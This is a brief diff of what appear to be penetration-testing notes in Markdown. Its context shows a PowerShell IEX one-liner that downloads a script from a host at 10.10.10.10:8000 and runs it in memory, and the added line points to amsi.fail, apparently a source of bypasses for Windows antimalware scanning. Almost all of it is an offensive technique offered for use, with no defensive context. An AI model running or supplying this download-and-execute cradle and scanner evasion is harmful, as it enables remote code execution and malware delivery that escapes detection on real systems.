@@ -56,3 +56,5 @@ Test using:
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/test')
 ```
+
+Sometimes works: https://amsi.fail/
